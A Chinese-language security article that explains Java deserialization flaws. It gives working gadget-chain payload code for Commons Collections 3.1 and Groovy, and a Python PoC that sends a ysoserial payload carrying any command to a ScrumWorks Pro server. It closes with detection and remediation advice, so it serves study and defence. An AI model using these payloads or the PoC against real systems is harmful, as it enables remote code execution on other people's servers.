## Java反序列化漏洞分析及检测方案

### 序列化与反序列化
序列化与反序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。

要对某个类对象进行序列化及反序列化操作，则该类必须实现Serializable接口，Serializable 接口是启用其序列化功能的接口，实现 java.io.Serializable 接口的类才是可序列化的，没有实现此接口的类将不能使它们的任一状态被序列化或逆序列化。我们定义一个实现了Serializable接口的类：

``` java
public class SerialObject implements Serializable{
    public String name;
    public String command;
    //重写readObject()方法
    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{
        //执行默认的readObject()方法
        in.defaultReadObject();
        //执行打开计算器程序命令
        Runtime.getRuntime().exec("open /Applications/Calculator.app/");
    }
}
```
上述示例代码中类SerialObject实现了Serializable接口，并重写了readObject方法执行Runtime.getRuntime().exec("open /Applications/Calculator.app/")。

Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的 writeObject() 方法可以实现序列化。

``` java
		......
		SerialObject myObj = new SerialObject();
        myObj.name = "kevin";
        myObj.command = "open /Applications/Calculator.app/";
        //创建一个包含对象进行反序列化信息的”object”数据文件
        FileOutputStream fos = new FileOutputStream("/Users/jingke/java/sofademo/object");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        //writeObject()方法将myObj对象写入object文件
        os.writeObject(myObj);
        os.close();
```

Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。

``` java
		......
		//从文件中反序列化obj对象
        FileInputStream fis = new FileInputStream("/Users/jingke/java/sofademo/object");
        ObjectInputStream ois = new ObjectInputStream(fis);
        //恢复对象
        SerialObject objectFromDisk = (SerialObject)ois.readObject();
        ois.close();
```

这里反序列化SerialObject类时会调用重写的readObject方法并运行计算器，显然现实中程序员不会这样去写代码。而且攻击者要利用程序中的类对象进行反序列化攻击，前提是要知道类的定义。所以从这点可以了解开源代码被反序列化漏洞利用的可能性更大。而已公开的反序列化漏洞利用基本上都是借助第三方库来实现。

### 反序列化漏洞成因
序列化和反序列化本身并不存在问题。但当反序列化的数据可以被恶意攻击者控制时，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的恶意代码。

上述这里特别要注意的是非预期的对象，由于要构造特定对象的前提是清楚该对象各属性及反序列化后参数进行各流程造成非预期的恶意操作。所以如Apache Commons Collections等开源的第三方库就成为了反序列化漏洞利用的关键。这些类库中实现的一些类可以被反序列化，并可被用来实现任意代码执行。类似的第三方类库可以看ysoserial，如commons-fileupload、commons-io等。这种库的存在极大地提升了反序列化问题的严重程度。

### 漏洞利用
#### 利用Apache Commons Collections实现远程代码执行

以commons-collections:3.1库为例(jdk版本为1.7)，反序列化漏洞利用payload生产代码如下:

```
		......
	    //创建一个包含对象进行反序列化信息的”objectexp”数据文件
        FileOutputStream fos = new FileOutputStream("/Users/jingke/java/sofademo/objectexp");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "open /Applications/Calculator.app" }) };
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innermap = new HashMap();
        innermap.put("value", "value");
        Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
        //通过反射获得AnnotationInvocationHandler类对象
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        //通过反射获得cls的构造函数
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        //这里需要设置Accessible为true，否则序列化失败
        ctor.setAccessible(true);
        //通过newInstance()方法实例化对象
        Object myObj = ctor.newInstance(Retention.class, outmap);
        //writeObject()方法将myObj对象写入object文件
        os.writeObject(myObj);
        os.close();
```

从逆向的角度出发，先分析这个payload，代码中先定义了一个 Transformer的数组transformers，第一个参数是ConstantTransformer类对象，后续均为 InvokerTransformer 对象，然后调用ChainedTransformer将多个Transformer串联构造出Transformer对象。ConstantTransformer、InvokerTransformer、ChainedTransformer均实现了的Transformer的transform方法，首先看Transforme接口，该接口仅实现了一个方法transform：

```
public Object transform(Object input);
```
可以看到该方法的作用是：给定一个 Object 对象经过转换后也返回一个 Object。

ConstantTransformer 类的 transform() 方法：

```
 public Object transform(Object input) {
        return iConstant;
    }
```
该方法返回 iConstant 属性，该属性为ConstantTransformer构造函数给值：

```
public ConstantTransformer(Object constantToReturn) {
        super();
        iConstant = constantToReturn;
    }
```
InvokerTransformer 类的 transform() 方法：

```
public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);
                
        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }
```

可以看到该方法中采用了反射的方法进行函数调用，Input 参数为要进行反射的对象 iMethodName , iParamTypes 为调用的方法名称以及该方法的参数类型，iArgs 为对应方法的参数，这三个参数均构造函数给值：

```
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }
```

然后看下ChainedTransformer类的transform() 方法：

```
public Object transform(Object object) {
        for (int i = 0; i < iTransformers.length; i++) {
            object = iTransformers[i].transform(object);
        }
        return object;
    }
```

这里iTransformers为ChainedTransformer构造函数输入的Transformer数组。然后使用了 for 循环来调用 Transformer 数组的 transform() 方法，并且将object作为后一个调用transform()方法的参数依次循环。结合前面paylaod中Transformer数组的组成：

```
new ConstantTransformer(Runtime.class),
new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "open /Applications/Calculator.app" }) };
```
经过调试循环处理后执行的代码是：

``` 
public java.lang.Process java.lang.Runtime.exec(“open /Applications/Calculator.app”) throws java.io.IOException
```

到这里我们明白漏洞利用需要触发ChainedTransformer对象的transform()函数，而TransformedMap的checkSetValue函数中就调用了transform方法：

``` 
protected Object checkSetValue(Object value) {
        return valueTransformer.transform(value);
    }
```

所以接着调用TransformedMap的decorate函数构造了TransformedMap对象，并将构造好的transformerChain给第三个参数valueTransformer：

```
Map innermap = new HashMap();
        innermap.put("value", "value");
        Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
```

以此想办法触发TransformedMap的checkSetValue方法，这里接着
构造对象AnnotationInvocationHandler，该对象通过newInstance方法实例化对象。通过getDeclaredConstructor获取该对象构造函数，包含两个参数分别是：

```
private final Class<? extends Annotation> type;
private final Map<String, Object> memberValues;
```

AnnotationInvocationHandler类是该payload构造的最终序列化的对象，该类实现了Serializable接口且重写了readObject方法。而其成员变量 memberValues 是 Map 类型，并且在重写的readObject方法中进行了setValue操作，而setValue则会触发TransformedMap的checkSetValue方法,从而实现反序列化漏洞利用并执行任意代码。

```
public Object setValue(Object value) {
            value = parent.checkSetValue(value);
            return entry.setValue(value);
        }
```

所以这里payload执行流程为:

AnnotationInvocationHandler.readObject()->map.setValue()->TransformedMap.checkSetValue()->ChainedTransformer.transform()-> InvokerTransformer.transform()->漏洞成功触发

commons-collections 3.2.2已经修复了该问题，具体可参考[Release notes for v3.2.2](http://commons.apache.org/proper/commons-collections/release_3_2_2.html)

#### 利用org.codehaus.groovy实现远程代码执行
groovy在2015年报出反序列化漏洞CVE-2015-3253,安全公告可参考[官网信息](http://groovy-lang.org/security.html)，漏洞介绍:

> The MethodClosure class in runtime/MethodClosure.java in Apache Groovy 1.7.0 through 2.4.3 allows remote attackers to execute arbitrary code or cause a denial of service via a crafted serialized object.

首先看groovy.util的Expando类中的hashCode方法：

```
public int hashCode() {
        Object method = getProperties().get("hashCode");
        if (method != null && method instanceof Closure) {
            // invoke overridden hashCode closure method
            Closure closure = (Closure) method;
            closure.setDelegate(this);
            Integer ret = (Integer) closure.call();
            return ret.intValue();
        } else {
            return super.hashCode();
        }
    }
```

可以看这里调用了Closure的call方法，call调用的实际是docall方法。Closure是抽象类，MethodClosure继承了它，并实现了docall方法：

```
protected Object doCall(Object arguments) {
        return InvokerHelper.invokeMethod(getOwner(), method, arguments);
    }
```

熟悉的函数名invokeMethod，见名知其意。看下具体实现：

```
    /**
     * Invokes the given method on the object.
     */
    public static Object invokeMethod(Object object, String methodName, Object arguments) {
        if (object == null) {
            object = NullObject.getNullObject();
            //throw new NullPointerException("Cannot invoke method " + methodName + "() on null object");
        }

        // if the object is a Class, call a static method from that class
        if (object instanceof Class) {
            Class theClass = (Class) object;
            MetaClass metaClass = metaRegistry.getMetaClass(theClass);
            return metaClass.invokeStaticMethod(object, methodName, asArray(arguments));
        }

        // it's an instance; check if it's a Java one
        if (!(object instanceof GroovyObject)) {
            return invokePojoMethod(object, methodName, arguments);
        }

        // a groovy instance (including builder, closure, ...)
        return invokePogoMethod(object, methodName, arguments);
    }
```

再看MethodClosure类的说明：
>Represents a method on an object using a closure which can be invoked at any time

大体说的是通过构建指定对象以及调用方法的Closure的实例就可以在任何时候进行调用。我们构造一个调用java.lang.ProcessBuilder对象的start方法来弹出计算器：

```
MethodClosure mc = new MethodClosure(new java.lang.ProcessBuilder("open","/Applications/Calculator.app"), "start");
mc.call();
```

这样基本上可以实现任意代码的执行，但反过来如何触发hashCode方法就是我们实现任意代码执行的关键。

首先我们需要知道hashCode函数的作用，当两个对象比较是否相等的时候，会调用该对象的hashCode以及equals方法进行比较，如果这两个方法返回的结果一致，那么认为这两个对象是相等，如果被调用对象没有重写hashCode以及equals方法，那么会调用父类的默认实现。

这里明白hashCode的作用之后，再来说说HashMap的put方法,该方法的定义如下

```
public V put(K key, V value) {
   if (key == null)
     return putForNullKey(value);
     int hash = hash(key.hashCode());
  ...
}
```

因为Map是一种key-value类型的数据结构，所以Map集合不允许有重复key，所以每次在往集合中添加键值对时会去判断key是否相等，那么在判断是否相等时会调用key的hashCode方法，如果我们精心构造一个groovy.util.Expando对象作为Map集合的key，那么在将对象添加进集合时就会触发groovy.util.Expando的hashCode方法，从而触发我们的恶意代码。

所以根据上面分析可以构造poc：

```
Map map = new HashMap<Expando, Integer>();
    Expando expando = new Expando();
 
    MethodClosure methodClosure = new MethodClosure(new java.lang.ProcessBuilder("open","/Applications/Calculator.app"), "start");
    //methodClosure.call();
 
    expando.setProperty("hashCode", methodClosure);
 
    map.put(expando, test);
```

最终的调用链如下:

>MapConverter#populateMap() calls HashMap#put()->HashMap#put() calls Expando#hashCode()->Expando#hashCode() calls MethodClosure#call()->MethodClosure#call() calls MethodClosure#doCall()->MethodClosure#doCall() calls InvokerHelper#invokeMethod()->InvokerHelper#invokeMethod() calls ProcessBuilder#start()

#### 利用其它库实现任意代码执行
除了commons-collections 3.1可以用来利用java反序列化漏洞，还有以下第三方库同样可以用来利用反序列化漏洞并执行任意代码：

* commons-fileupload 1.3.1 
* commons-io 2.4 
* commons-collections 3.1 
* commons-logging 1.2  
* commons-beanutils 1.9.2  
* org.slf4j:slf4j-api 1.7.21  
* com.mchange:mchange-commons-java 0.2.11 
* org.apache.commons:commons-collections  4.0 
* com.mchange:c3p0 0.9.5.2 
* org.beanshell:bsh 2.0b5 
* org.codehaus.groovy:groovy 2.3.9 
* org.springframework:spring-aop 4.1.4.RELEASE 
* ......

### 漏洞分析
#### 概述
国外安全人员发现ScrumWorks Pro 6.7.0版本中存在反序列化漏洞，成功利用该漏洞可导致任意代码执行。
>CollabNet ScrumWorks Pro is an Agile Project Management for Developers, Scrum Masters, and Business”. A trial version can be downloaded from the vendor: [https://www.collab.net/products/scrumworks](https://www.collab.net/products/scrumworks)

#### 漏洞原理
ScrumWorks Pro提供一个web接口可以通过Java Web Start (JNLP)启动java客户端程序，java客户端发送反序列化对象给服务端程序，服务端接收数据处理函数如下：

```
---
protected void doPost(HttpServletRequest paramHttpServletRequest, HttpServletResponse paramHttpServletResponse)
    throws IOException
  {
    ServerSession localServerSession = getSession(paramHttpServletRequest);
    
    AbstractExecutableCommand localAbstractExecutableCommand = null;
    ObjectInputStream localObjectInputStream = new ObjectInputStream(new GZIPInputStream(paramHttpServletRequest.getInputStream()));
    try
    {
      AbstractCommand localAbstractCommand = (AbstractCommand)localObjectInputStream.readObject();
      localAbstractExecutableCommand = (AbstractExecutableCommand)Class.forName(getExecutableCommandName(localAbstractCommand)).newInstance();
      
      paramHttpServletResponse.addHeader("X-SWP-responseType", "object");
      if (localServerSession.isExpired())
      {
        paramHttpServletRequest.getSession().invalidate();
        sendResponse(paramHttpServletResponse, new ReAuthenticateException());
        return;
      }
      localObject1 = ControllerUtils.extractUserFromAuthorizationHeader(paramHttpServletRequest);
      String str = localObject1 == null ? null : ((UserTO)localObject1).getUserName();
      LOGGER.info("[User: " + str + "] command: " + localAbstractCommand);
      if (Maintenance.isMaintenanceMode()) {
        sendResponse(paramHttpServletResponse, ServerException.getMaintenanceModeException());
      } else {
        runCommandIfAuthorized((UserTO)localObject1, localAbstractExecutableCommand, localAbstractCommand, paramHttpServletResponse);
      }
    }
    catch (ServerException localServerException)
    {
      localServerException.printStackTrace();
      sendResponse(paramHttpServletResponse, localServerException);
    }
    catch (InvalidClassException localInvalidClassException)
    {
      LOGGER.error("An outdated client tried to send a command.  Please log out and restart the client.");
      sendResponse(paramHttpServletResponse, new ServerException("The server has been updated.  Please relaunch your client.", localInvalidClassException));
    }
    catch (Exception localException)
    {
      LOGGER.debug("error handling request", localException);
      Object localObject1 = unwrapException(localException);
      LOGGER.error("error executing a command", (Throwable)localObject1);
      if (localAbstractExecutableCommand != null) {
        sendResponse(paramHttpServletResponse, ServerException.getMisconfiguredServerException((Exception)localObject1));
      }
    }
    finally
    {
      localObjectInputStream.close();
    }
  }
 
---
```

可以看到首先对数据进行了zip解码，然后使用ObjectInputStream的readObject读取反序列化对象，造成反序列化漏洞。而ScrumWorks使用了第三方库Apache CommonsCollections (3.2.1)，利用ysoserial生产payload即可利用该漏洞。

#### POC

```python
#
# Scrumworks Java Deserialization Remote Code Execution PoC
# 
import httplib
import urllib
import sys

import binascii

# load the ysoserial.jar file 
sys.path.append("./ysoserial.jar")

from ysoserial import *
from ysoserial.payloads import *

# ZIP support
from java.io import ByteArrayOutputStream
from java.io import ObjectOutputStream
from java.util.zip import GZIPOutputStream


print "Scrumworks Java Deserialization Remote Code Execution PoC"
print "========================================================="

if len(sys.argv) != 4:
  print "usage: " + sys.argv[0] + " host port command\n"  
  exit(3)

payloadName = "CommonsCollections5"
payloadClass = ObjectPayload.Utils.getPayloadClass(payloadName);

if payloadClass is None:
  print("Can't load ysoserial payload class")
  exit(2);

# serialize payload
payload = payloadClass.newInstance()
exploitObject = payload.getObject(sys.argv[3])

# create streams
byteStream = ByteArrayOutputStream()
zipStream = GZIPOutputStream(byteStream)
objectStream = ObjectOutputStream(zipStream) 
objectStream.writeObject(exploitObject)

# close streams
objectStream.flush()
objectStream.close()
zipStream.close()
byteStream.close()

# http request
print "sending serialized command"
conn = httplib.HTTPConnection(sys.argv[1] + ":" + sys.argv[2])
conn.request("POST", "/scrumworks/UFC-poc-", byteStream.toByteArray())
response = conn.getresponse()
conn.close()
print "done"
---
```

### 漏洞检测方案
#### 白盒检测
* 检测规则一，从漏洞利用原理角度出发：检测可利用的第三方库及版本，但这个可能会有遗漏，就是对引用的第三方库中是否也引入了这些可利用的第三方库。

* 检测规则二，解析java源代码，可以被序列化的类一定实现了Serializable接口且重写了readObject()方法。如果在项目代码某处调用了ObjectInputStream.readObject()且反序列化对象追溯到是可由外部参数输入控制则基本可以确定存在反序列化漏洞啦
#### 黑盒检测
调用ysoserial并依次生成各个第三方库的利用payload(也可以先分析依赖第三方包量，调用最多的几个库的paylaod即可)，模拟http请求发送反序列化payload。可参考https://github.com/NickstaDB/SerialBrute/。根据代码执行成功与否判断是否存在漏洞。可以构造访问特定http站点的payload，以http访问请求记录判断代码是否执行。

#### 攻击检测
通过查看反序列化后的数据，可以看到反序列化数据开头包含两字节的魔术数字，这两个字节始终为十六进制的0xAC ED。接下来是两字节的版本号。我只见到过版本号为5（0x00 05）的数据。考虑到zip、base64各种编码，在攻击检测时可针对该特征进行匹配请求post中是否包含反序列化数据，判断是否为反序列化漏洞攻击。

		00000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
		00000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
		00000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
		00000030: 696f 6e48 616e 646c 6572 55ca f50f 15cb  ionHandlerU.....


### 修复方案
* 更新commons-collections、commons-io等第三方库版本；
* 业务需要使用反序列化时，尽量避免反序列化数据可被用户控制，如果无法避免，则对反序列化后的类做白名单校验
* 禁止 JVM 执行外部命令 Runtime.exec

### 参考文献
* https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/
* https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
* https://github.com/frohoff/ysoserial
* https://paper.seebug.org/312/
* https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/
* Deserialize My Shorts:Or How I Learned to Start Worrying and Hate Java Object Deserialization
* Exploiting Deserialization Vulnerabilities in Java
* https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream
* https://github.com/NickstaDB/SerialBrute/
